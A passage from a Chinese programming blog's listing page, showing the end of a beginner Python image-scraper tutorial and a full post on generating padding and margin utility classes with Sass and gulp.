class="number">1</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    print(<span class="string">u'代理也不好使了！取消代理'</span>)</span><br><span class="line">                    <span class="keyword">return</span> self.get(url, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">request = download()  <span class="comment">##</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>这个模块就多了 request = download() 第二个（def mzitu.py）:</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> Download <span class="keyword">import</span> request <span class="comment">##导入模块变了一下</span></span><br><span class="line"><span class="keyword">from</span> pymongo <span class="keyword">import</span> MongoClient</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mzitu</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">all_url</span><span class="params">(self, url)</span>:</span></span><br><span class="line"></span><br><span class="line">        html = request.get(url, <span class="number">3</span>) <span class="comment">##这儿更改了一下（是不是发现  self 没见了？）</span></span><br><span class="line">        all_a = BeautifulSoup(html.text, <span class="string">'lxml'</span>).find(<span class="string">'div'</span>, class_=<span class="string">'all'</span>).find_all(<span class="string">'a'</span>)</span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> all_a:</span><br><span class="line">            title = a.get_text()</span><br><span class="line">            print(<span class="string">u'开始保存：'</span>, title)</span><br><span class="line">            path = str(title).replace(<span class="string">"?"</span>, <span class="string">'_'</span>)</span><br><span class="line">            self.mkdir(path)</span><br><span class="line">            os.chdir(<span class="string">"D:\mzitu\\"</span>+path)</span><br><span class="line">            href = a[<span class="string">'href'</span>]</span><br><span class="line">            self.html(href)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">html</span><span class="params">(self, href)</span>:</span></span><br><span class="line">        html = request.get(href, <span class="number">3</span>)<span class="comment">##这儿更改了一下（是不是发现  self 没见了？）</span></span><br><span class="line">        max_span = BeautifulSoup(html.text, <span class="string">'lxml'</span>).find_all(<span class="string">'span'</span>)[<span class="number">10</span>].get_text()</span><br><span class="line">        <span class="keyword">for</span> page <span class="keyword">in</span> range(<span class="number">1</span>, int(max_span) + <span class="number">1</span>):</span><br><span class="line">            page_url = href + <span class="string">'/'</span> + str(page)</span><br><span class="line">            self.img(page_url)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">img</span><span class="params">(self, page_url)</span>:</span></span><br><span class="line">        img_html = request.get(page_url, <span class="number">3</span>) <span class="comment">##这儿更改了一下（是不是发现  self 没见了？）</span></span><br><span class="line">        img_url = BeautifulSoup(img_html.text, <span class="string">'lxml'</span>).find(<span class="string">'div'</span>, class_=<span class="string">'main-image'</span>).find(<span class="string">'img'</span>)[<span class="string">'src'</span>]</span><br><span class="line">        self.save(img_url)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">save</span><span class="params">(self, img_url)</span>:</span></span><br><span class="line">        name = img_url[<span class="number">-9</span>:<span class="number">-4</span>]</span><br><span class="line">        print(<span class="string">u'开始保存：'</span>, img_url)</span><br><span class="line">        img = request.get(img_url, <span class="number">3</span>) <span class="comment">##这儿更改了一下（是不是发现  self 没见了？）</span></span><br><span class="line">        f = open(name + <span class="string">'.jpg'</span>, <span class="string">'ab'</span>)</span><br><span class="line">        f.write(img.content)</span><br><span class="line">        f.close()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">mkdir</span><span class="params">(self, path)</span>:</span></span><br><span class="line">        path = path.strip()</span><br><span class="line">        isExists = os.path.exists(os.path.join(<span class="string">"D:\mzitu"</span>, path))</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> isExists:</span><br><span class="line">            print(<span class="string">u'建了一个名字叫做'</span>, path, <span class="string">u'的文件夹！'</span>)</span><br><span class="line">            os.makedirs(os.path.join(<span class="string">"D:\mzitu"</span>, path))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">u'名字叫做'</span>, path, <span class="string">u'的文件夹已经存在了！'</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mzitu = mzitu() <span class="comment">##实例化</span></span><br><span class="line">Mzitu.all_url(<span class="string">'http://www.mzitu.com/all'</span>) <span class="comment">##给函数all_url传入参数  你可以当作启动爬虫（就是入口）</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>改动的地方我都有明确标注哦！仔细看看有什么不同吧。</p>
                  </p>
                </div>
              </div>
              <div class="post-meta">
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-user"></i>
                  </span>
                  <span class="post-meta-item-text">作者</span>
                  <span><a href="/authors/哎哟卧槽" class="author" itemprop="url" rel="index">哎哟卧槽</a></span>
                </span>
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-calendar"></i>
                  </span>
                  <span class="post-meta-item-text">发表于</span>
                  <time title="创建时间：2016-10-30 14:56:23" itemprop="dateCreated datePublished" datetime="2016-10-30T14:56:23+08:00">2016-10-30</time>
                </span>
                <span id="/3256.html" class="post-meta-item leancloud_visitors" data-flag-title="小白爬虫第二弹之健壮的小爬虫" title="阅读次数">
                  <span class="post-meta-item-icon">
                    <i class="fa fa-eye"></i>
                  </span>
                  <span class="post-meta-item-text">阅读次数：</span>
                  <span class="leancloud-visitors-count"></span>
                </span>
                <span class="post-meta-item" title="本文字数">
                  <span class="post-meta-item-icon">
                    <i class="far fa-file-word"></i>
                  </span>
                  <span class="post-meta-item-text">本文字数：</span>
                  <span>23k</span>
                </span>
                <span class="post-meta-item" title="阅读时长">
                  <span class="post-meta-item-icon">
                    <i class="far fa-clock"></i>
                  </span>
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                  <span>21 分钟</span>
                </span>
              </div>
            </article>
            <article itemscope itemtype="http://schema.org/Article" class="post-block index" lang="zh-CN">
              <link itemprop="mainEntityOfPage" href="https://cuiqingcai.com/3276.html">
              <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
                <meta itemprop="image" content="/images/avatar.png">
                <meta itemprop="name" content="崔庆才">
                <meta itemprop="description" content="静觅丨崔庆才的个人站点专业为您提供爬虫教程,爬虫,Python,Python爬虫,Python爬虫教程,爬虫书的相关信息，想要了解更多详情，请联系我们。">
              </span>
              <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
                <meta itemprop="name" content="静觅">
              </span>
              <header class="post-header">
                <h2 class="post-title" itemprop="name headline">
                  <a class="label"> HTML <i class="label-arrow"></i>
                  </a>
                  <a href="/3276.html" class="post-title-link" itemprop="url">利用Sass自动生成padding和margin边距样式</a>
                </h2>
              </header>
              <div class="post-body" itemprop="articleBody">
                <div class="thumb">
                  <img itemprop="contentUrl" class="random">
                </div>
                <div class="excerpt">
                  <p>
                  <h2 id="需求分析"><a href="#需求分析" class="headerlink" title="需求分析"></a>需求分析</h2>
                  <p>有需求才有动力！ 写CSS的时候，你经常会遇到要设置一个小边距，比如设置： 所有内边距10px，外左边距20px，内右边距0，上下内边距50px，外左右边距自动…. 而你是不是又不想自己单独为它们定义一个class，然后把padding, margin之类的写进去？ 举例如下： 现在我有两个p标签，我想让这两个p标签中间相隔10px，那是不是需要？</p>
                  <figure class="highlight xml">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">"margin-bottom:10px"</span>&gt;</span>Hello<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>World<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>又或者</p>
                  <figure class="highlight cpp">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">&lt;p <span class="class"><span class="keyword">class</span>="<span class="title">m</span>"&gt;<span class="title">Hello</span>&lt;/p&gt;</span></span><br><span class="line"><span class="class">&lt;p&gt;<span class="title">World</span>&lt;/p&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">.<span class="title">m</span> &#123;</span></span><br><span class="line">    margin-bottom: <span class="number">10</span>px;</span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>类似这样的情况多了去了，每次都要定个样式就为了解决个边距问题？ 能忍吗？能忍吗？反正我是不能忍。改改改，燥起来！</p>
                  <h2 id="协议规定"><a href="#协议规定" class="headerlink" title="协议规定"></a>协议规定</h2>
                  <p>那么为了解决这么一个问题，我们首先要想好解决标准。</p>
                  <h3 id="边距层级"><a href="#边距层级" class="headerlink" title="边距层级"></a>边距层级</h3>
                  <p>首先边距问题，我们首先要定义这么几个层级： 极小、很小、小、正常、中等、大、很大、极大。 对应的边距划分为： 2px、5px、10px、15px、20px、30px、40px、50px。 那么代号就标记为： xxs、xs、sm、‘空’、md、lg、xl、xxl。 另外我们还有其他的样式，比如自动auto、初始化initial、继承inherit、无边距none。 那么代号标记为auto、ii、ih、none。 这样的划分基本可以满足需求。</p>
                  <h3 id="简称划分"><a href="#简称划分" class="headerlink" title="简称划分"></a>简称划分</h3>
                  <p>然后定义几个简称： 我们用到的单词有内边距、外边距、上下左右等，那么定义如下： padding-&gt;p、margin-&gt;m、right-&gt;r、left-&gt;l、top-&gt;t、bottom-&gt;b、horizontal-&gt;h、vertical-&gt;v。 其中horizontal和vertical指代水平方向和垂直方向，也就是同时设置左右或者同时设置上下。 当然不能忽略了反向边距，比如外边距是负10px，这个也需要用一个简称，我们定义为n，是反向的意思。 如此一来，所有的简称和边距就规定好了。</p>
                  <h2 id="实例说明"><a href="#实例说明" class="headerlink" title="实例说明"></a>实例说明</h2>
                  <p>通过上面的层级关系和简称划分，我们可以对他们进行自由组合，形成一个个class样式。比如： .p-t-xs 即为上内边距是5px，.p-h-md 即为左右内边距是20px，.p-b-n-lg 即为下内边距是-30px， .p-r-xxl 即为右内边距是50px，.p-t 即为上内边距为正常边距15px（正常边距省略即可），.p-n 即为内边距是-15px。 .p-v-n 即为上下内边距是-15px，.m-h-auto 即为水平左右外边距是自动auto, .m-t-ii 即为上外边距是初始化initial。 .m-r-none 即为右外边距是0。 怎样？通过这样的定义，能不能找出规律？即 第一个字母p或者m，代表padding或者margin。 第二个字母代表方向，t上方、b下方、l左方、r右方、v上方和下方、h左方和右方。 第三个（组）字母代表距离，xs是+2px，n-lg是-30px，空是自动边距15px，n是反向正常值-15px，ii是初始化，none是无，auto是自动边距。 怎样？有了这些定义，我们是不是就能非常方便地设置边距样式了？刚才的边距怎样解决？很简单，只需要</p>
                  <figure class="highlight xml">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"m-b-sm"</span>&gt;</span>Hello<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>World<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>如果一个网页里有很多样式，那只需要把整个样式文件引入，自由地添加class就好了。</p>
                  <h2 id="编写Sass"><a href="#编写Sass" class="headerlink" title="编写Sass"></a>编写Sass</h2>
                  <p>这么多组合呢？写CSS不累死了？检查也不好检查。 怎么办？上Sass！ 首先我们先定义一层映射，边距映射：</p>
                  <figure class="highlight groovy">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="string">$map:</span> (<span class="string">none:</span> <span class="number">0</span>, <span class="string">auto:</span> auto, <span class="string">ii:</span> initial, <span class="string">ih:</span> inherit, <span class="string">xxs:</span> <span class="number">2</span>px, <span class="string">xs:</span> <span class="number">5</span>px, <span class="string">sm:</span> <span class="number">10</span>px, <span class="string">''</span>: <span class="number">15</span>px, <span class="string">md:</span> <span class="number">20</span>px, <span class="string">lg:</span> <span class="number">30</span>px, <span class="string">xl:</span> <span class="number">40</span>px, <span class="string">xxl:</span> <span class="number">50</span>px,</span><br><span class="line">        n-<span class="string">xxs:</span> <span class="number">-2</span>px, n-<span class="string">xs:</span> <span class="number">-5</span>px, n-<span class="string">sm:</span> <span class="number">-10</span>px, <span class="string">n:</span> <span class="number">-15</span>px, n-<span class="string">md:</span> <span class="number">20</span>px, n-<span class="string">lg:</span> <span class="number">30</span>px, n-<span class="string">xl:</span> <span class="number">-40</span>px, n-<span class="string">xxl:</span> <span class="number">-50</span>px);</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>这里定义了所有的边距和它的简称。 然后我们尝试写一下padding的函数，遍历一下：</p>
                  <figure class="highlight scss">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">@each</span> <span class="variable">$style</span>, <span class="variable">$padding</span> in <span class="variable">$map</span> &#123;</span><br><span class="line"> <span class="selector-class">.p-</span>#&#123;<span class="variable">$style</span>&#125; &#123;</span><br><span class="line">   <span class="attribute">padding</span>: <span class="variable">$padding</span> <span class="meta">!important</span>;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>这，那空的咋办? 不能留个下划线啊。判断一下</p>
                  <figure class="highlight scss">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">@function</span> line(<span class="variable">$style</span>) &#123;</span><br><span class="line">  <span class="keyword">@if</span> <span class="variable">$style</span> != <span class="string">''</span> &#123;</span><br><span class="line">    <span class="keyword">@return</span> <span class="string">'-'</span>;</span><br><span class="line">  &#125; <span class="keyword">@else</span> &#123;</span><br><span class="line">    <span class="keyword">@return</span> <span class="string">''</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">@each</span> <span class="variable">$style</span>, <span class="variable">$padding</span> in <span class="variable">$map</span> &#123;</span><br><span class="line">  <span class="variable">$line</span>: line(<span class="variable">$style</span>);</span><br><span class="line"> <span class="selector-class">.p</span>#&#123;line&#125;#&#123;<span class="variable">$style</span>&#125; &#123;</span><br><span class="line">   <span class="attribute">padding</span>: <span class="variable">$padding</span> <span class="meta">!important</span>;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>这样我们就生成了所有padding边距的设置。 好接下来设置下水平和垂直边距吧，这个就需要两句话了，比如设置水平你得写padding-left 和 padding-right。 有的小伙伴说了，可以直接写一个啊，比如 padding: 0 20px 就可以，不过这样你同时设置了上下边距。即便上下边距我们设置成inherit或者什么其他的，那也多多少少在某种情况下产生影响。 所以这里我们直接分开，而且就算不分开，你之前的映射就要修改，还是麻烦的。 所以这里定义如下：</p>
                  <figure class="highlight scss">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">@each</span> <span class="variable">$style</span>, <span class="variable">$padding</span> in <span class="variable">$map</span> &#123;</span><br><span class="line">    <span class="variable">$line</span>: line(<span class="variable">$style</span>);</span><br><span class="line">    <span class="selector-class">.p-v</span>#&#123;<span class="variable">$line</span>&#125;#&#123;<span class="variable">$style</span>&#125; &#123;</span><br><span class="line">      <span class="attribute">padding-top</span>: <span class="variable">$padding</span> <span class="meta">!important</span>;</span><br><span class="line">      <span class="attribute">padding-bottom</span>: <span class="variable">$padding</span> <span class="meta">!important</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">@each</span> <span class="variable">$style</span>, <span class="variable">$padding</span> in <span class="variable">$map</span> &#123;</span><br><span class="line">    <span class="variable">$line</span>: line(<span class="variable">$style</span>);</span><br><span class="line">    <span class="selector-class">.p-h</span>#&#123;<span class="variable">$line</span>&#125;#&#123;<span class="variable">$style</span>&#125; &#123;</span><br><span class="line">      <span class="attribute">padding-left</span>: <span class="variable">$padding</span> <span class="meta">!important</span>;</span><br><span class="line">      <span class="attribute">padding-right</span>: <span class="variable">$padding</span> <span class="meta">!important</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>那最后，单边距的定义如下，我们给它加个循环：</p>
                  <figure class="highlight scss">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="variable">$directions</span>: (t: top, b: bottom, l: left, r:right);</span><br><span class="line">  <span class="keyword">@each</span> <span class="variable">$d-key</span>, <span class="variable">$d-value</span> in <span class="variable">$directions</span> &#123;</span><br><span class="line">    <span class="keyword">@each</span> <span class="variable">$style</span>, <span class="variable">$padding</span> in <span class="variable">$map</span> &#123;</span><br><span class="line">      <span class="variable">$line</span>: line(<span class="variable">$style</span>);</span><br><span class="line">      <span class="selector-class">.p-</span>#&#123;<span class="variable">$d-key</span>&#125;#&#123;<span class="variable">$line</span>&#125;#&#123;<span class="variable">$style</span>&#125; &#123;</span><br><span class="line">        <span class="attribute">padding</span>-#&#123;<span class="variable">$d-value</span>&#125;: <span class="variable">$padding</span> <span class="meta">!important</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>如此一来，padding的就写好了！ 那么margin的怎么办？很简单，再加一层循环，最终代码如下：</p>
                  <figure class="highlight scss">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">@function</span> line(<span class="variable">$style</span>) &#123;</span><br><span class="line">  <span class="keyword">@if</span> <span class="variable">$style</span> != <span class="string">''</span> &#123;</span><br><span class="line">    <span class="keyword">@return</span> <span class="string">'-'</span>;</span><br><span class="line">  &#125; <span class="keyword">@else</span> &#123;</span><br><span class="line">    <span class="keyword">@return</span> <span class="string">''</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$map</span>: (none: <span class="number">0</span>, auto: auto, ii: initial, ih: inherit, xxs: <span class="number">2px</span>, xs: <span class="number">5px</span>, sm: <span class="number">10px</span>, <span class="string">''</span>: <span class="number">15px</span>, md: <span class="number">20px</span>, lg: <span class="number">30px</span>, xl: <span class="number">40px</span>, xxl: <span class="number">50px</span>,</span><br><span class="line">        n-xxs: -<span class="number">2px</span>, n-xs: -<span class="number">5px</span>, n-sm: -<span class="number">10px</span>, n: -<span class="number">15px</span>, n-md: <span class="number">20px</span>, n-lg: <span class="number">30px</span>, n-xl: -<span class="number">40px</span>, n-xxl: -<span class="number">50px</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$names</span>: (m: margin, p: padding);</span><br><span class="line"><span class="keyword">@each</span> <span class="variable">$n-key</span>, <span class="variable">$n-value</span> in <span class="variable">$names</span> &#123;</span><br><span class="line">  <span class="keyword">@each</span> <span class="variable">$style</span>, <span class="variable">$padding</span> in <span class="variable">$map</span> &#123;</span><br><span class="line">    <span class="variable">$line</span>: line(<span class="variable">$style</span>);</span><br><span class="line">    .#&#123;<span class="variable">$n-key</span>&#125;#&#123;<span class="variable">$line</span>&#125;#&#123;<span class="variable">$style</span>&#125; &#123;</span><br><span class="line">      #&#123;<span class="variable">$n-value</span>&#125;: <span class="variable">$padding</span> <span class="meta">!important</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">@each</span> <span class="variable">$style</span>, <span class="variable">$padding</span> in <span class="variable">$map</span> &#123;</span><br><span class="line">    <span class="variable">$line</span>: line(<span class="variable">$style</span>);</span><br><span class="line">    .#&#123;<span class="variable">$n-key</span>&#125;-v#&#123;<span class="variable">$line</span>&#125;#&#123;<span class="variable">$style</span>&#125; &#123;</span><br><span class="line">      #&#123;<span class="variable">$n-value</span>&#125;-<span class="attribute">top</span>: <span class="variable">$padding</span> <span class="meta">!important</span>;</span><br><span class="line">      #&#123;<span class="variable">$n-value</span>&#125;-<span class="attribute">bottom</span>: <span class="variable">$padding</span> <span class="meta">!important</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">@each</span> <span class="variable">$style</span>, <span class="variable">$padding</span> in <span class="variable">$map</span> &#123;</span><br><span class="line">    <span class="variable">$line</span>: line(<span class="variable">$style</span>);</span><br><span class="line">    .#&#123;<span class="variable">$n-key</span>&#125;-h#&#123;<span class="variable">$line</span>&#125;#&#123;<span class="variable">$style</span>&#125; &#123;</span><br><span class="line">      #&#123;<span class="variable">$n-value</span>&#125;-<span class="attribute">left</span>: <span class="variable">$padding</span> <span class="meta">!important</span>;</span><br><span class="line">      #&#123;<span class="variable">$n-value</span>&#125;-<span class="attribute">right</span>: <span class="variable">$padding</span> <span class="meta">!important</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$directions</span>: (t: top, b: bottom, l: left, r:right);</span><br><span class="line">  <span class="keyword">@each</span> <span class="variable">$d-key</span>, <span class="variable">$d-value</span> in <span class="variable">$directions</span> &#123;</span><br><span class="line">    <span class="keyword">@each</span> <span class="variable">$style</span>, <span class="variable">$padding</span> in <span class="variable">$map</span> &#123;</span><br><span class="line">      <span class="variable">$line</span>: line(<span class="variable">$style</span>);</span><br><span class="line">      .#&#123;<span class="variable">$n-key</span>&#125;-#&#123;<span class="variable">$d-key</span>&#125;#&#123;<span class="variable">$line</span>&#125;#&#123;<span class="variable">$style</span>&#125; &#123;</span><br><span class="line">        #&#123;<span class="variable">$n-value</span>&#125;-#&#123;<span class="variable">$d-value</span>&#125;: <span class="variable">$padding</span> <span class="meta">!important</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>如此一来，Sass便成功生成了。</p>
                  <h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2>
                  <p>写完了那自然要编译一下咯，废话不多说上gulp。</p>
                  <figure class="highlight less">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="selector-tag">gulp</span><span class="selector-class">.task</span>(<span class="string">'styles'</span>, () =&gt; &#123;</span><br><span class="line">    <span class="selector-tag">return</span> <span class="selector-tag">gulp</span><span class="selector-class">.src</span>(path.sass)</span><br><span class="line">    <span class="selector-class">.pipe</span>(plumber())</span><br><span class="line">    <span class="selector-class">.pipe</span>(sourcemaps.init())</span><br><span class="line">    <span class="selector-class">.pipe</span>(sass(&#123;<span class="attribute">outputStyle</span>: <span class="string">'compressed'</span>&#125;).on(<span class="string">'error'</span>, sass.logError))</span><br><span class="line">    <span class="selector-class">.pipe</span>(sourcemaps.write())</span><br><span class="line">    <span class="selector-class">.pipe</span>(autoprefixer(&#123;</span><br><span class="line">        <span class="attribute">browsers</span>: [<span class="string">'last 2 versions'</span>],</span><br><span class="line">        <span class="attribute">cascade</span>: true,</span><br><span class="line">        <span class="attribute">remove</span>: true</span><br><span class="line">    &#125;))</span><br><span class="line">    <span class="selector-class">.pipe</span>(gulp.dest(path.dest.css));</span><br><span class="line">&#125;);</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>或者你们有考拉编译器啊或者其他的都行，能编译就好。 生成的部分结果展示如下：</p>
                  <figure class="highlight css">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="selector-class">.m-none</span>&#123;<span class="attribute">margin</span>:<span class="number">0</span> <span class="meta">!important</span>&#125;<span class="selector-class">.m-auto</span>&#123;<span class="attribute">margin</span>:auto <span class="meta">!important</span>&#125;<span class="selector-class">.m-ii</span>&#123;<span class="attribute">margin</span>:initial <span class="meta">!important</span>&#125;<span class="selector-class">.m-ih</span>&#123;<span class="attribute">margin</span>:inherit <span class="meta">!important</span>&#125;<span class="selector-class">.m-xxs</span>&#123;<span class="attribute">margin</span>:<span class="number">2px</span> <span class="meta">!important</span>&#125;<span class="selector-class">.m-xs</span>&#123;<span class="attribute">margin</span>:<span class="number">5px</span> <span class="meta">!important</span>&#125;<span class="selector-class">.m-sm</span>&#123;<span class="attribute">margin</span>:<span class="number">10px</span> <span class="meta">!important</span>&#125;<span class="selector-class">.m</span>&#123;<span class="attribute">margin</span>:<span class="number">15px</span> <span class="meta">!important</span>&#125;<span class="selector-class">.m-md</span>&#123;<span class="attribute">margin</span>:<span class="number">20px</span> <span class="meta">!important</span>&#125;<span class="selector-class">.m-lg</span>&#123;<span class="attribute">margin</span>:<span class="number">30px</span> <span class="meta">!important</span>&#125;<span class="selector-class">.m-xl</span>&#123;<span class="attribute">margin</span>:<span class="number">40px</span> <span class="meta">!important</span>&#125;<span class="selector-class">.m-xxl</span>&#123;<span class="attribute">margin</span>:<span 